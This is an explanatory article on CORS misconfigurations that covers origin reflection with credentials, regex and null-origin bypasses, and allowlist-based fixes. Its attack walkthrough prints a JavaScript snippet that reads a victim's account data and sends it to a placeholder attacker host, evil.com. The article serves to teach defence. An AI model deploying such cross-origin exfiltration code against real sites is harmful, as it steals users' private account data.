How CORS Misconfigurations Lead to Data Theft

Cross-Origin Resource Sharing (CORS) is a browser mechanism that relaxes the strict boundaries of the Same-Origin Policy (SOP) to allow web applications to share resources across different domains. When developers implement CORS incorrectly—particularly by dynamically trusting arbitrary origins while allowing authenticated credentials—they introduce a critical vulnerability. This article explains how the Same-Origin Policy works, explores the specific header flaws that break this security model, and details the step-by-step process attackers use to silently read and steal private user data.

The Role of the Same-Origin Policy

The Same-Origin Policy is the foundational security model of modern web browsers. It restricts scripts running on one origin (a combination of protocol, domain, and port) from accessing data from a different origin. For instance, JavaScript executing on malicious-site.com cannot normally inspect the HTTP response returned from bank.com, preventing unauthorized access to sensitive account information.

CORS was introduced to bypass this restriction in a controlled manner. A server can declare which external origins are permitted to access its resources using specific HTTP response headers.

The Mechanism of a CORS Misconfiguration

Browsers do not block cross-origin requests from being sent; rather, they block the calling script from reading the server's response unless the server explicitly grants permission via CORS headers.

A secure CORS setup relies primarily on two response headers:

  • Access-Control-Allow-Origin: Specifies which origins can read the response.
  • Access-Control-Allow-Credentials: When set to true, it informs the browser that the response can be shared with the client script even if the request included sensitive credentials such as cookies or HTTP authentication.

Security specifications forbid browsers from allowing Access-Control-Allow-Credentials: true in conjunction with a wildcard origin (Access-Control-Allow-Origin: *). To circumvent this restriction and support multiple legitimate domains, developers frequently write code that dynamically copies the request's Origin header into the Access-Control-Allow-Origin response header.

When a server reflects any provided Origin header without strict validation and simultaneously sets Access-Control-Allow-Credentials: true, it effectively trusts every domain on the internet.

Step-by-Step Data Exfiltration Attack

When a vulnerable application blindly reflects origins with credentials enabled, an attacker can steal data through a straightforward sequence:

  1. Authentication: The victim authenticates to the target application (vulnerable-bank.com), establishing an active session stored in an HTTP-only cookie.
  2. Luring the Target: The attacker entices the victim to visit a malicious website (evil.com) via phishing, malicious advertisements, or an untrusted link.
  3. Triggering the Cross-Origin Request: The attacker's webpage executes JavaScript that makes an asynchronous request to the target's API endpoint: 
    fetch("https://vulnerable-bank.com/api/user/details", {
    method: "GET",
    credentials: "include"
})
.then(response => response.json())
.then(data => {
    // Send stolen data to attacker server
    fetch("https://evil.com/log?data=" + encodeURIComponent(JSON.stringify(data)));
});
  4. Credential Inclusion: Because credentials: "include" is set, the victim's browser automatically attaches the authentication cookies for vulnerable-bank.com to the outgoing request.
  5. Server Reflection: The vulnerable server receives the request, reads Origin: https://evil.com, and responds with: 
    HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"username": "victim", "balance": 15000, "account_number": "1234-5678"}
  6. Data Theft: The browser inspects the response headers, sees that evil.com is explicitly authorized with credentials enabled, and allows the malicious script to access the response body. The script then transmits the sensitive payload to the attacker's server.

Other Common CORS Implementation Flaws

Beyond simple origin reflection, attackers routinely exploit other parsing errors:

  • Regex and Prefix/Suffix Bypass: Weak regular expressions intended to validate subdomains can be subverted. If a policy checks for target.com, an attacker can register target.com.attacker.com or eviltarget.com to pass the origin check.
  • Trusting the null Origin: Some servers explicitly allow Access-Control-Allow-Origin: null to accommodate local development or file protocols. Attackers can trigger a null origin using sandboxed <iframe> tags on a malicious site, thereby bypassing the check and reading sensitive data.

Securing CORS Implementations

To prevent data theft via CORS misconfigurations, servers must never dynamically mirror the Origin header when Access-Control-Allow-Credentials is set to true. Cross-origin access should instead be granted using a strictly defined, server-side allowlist of trusted domains. Furthermore, sensitive endpoints containing personal data, internal state, or security tokens should avoid enabling CORS altogether unless cross-origin interaction is fundamentally required.
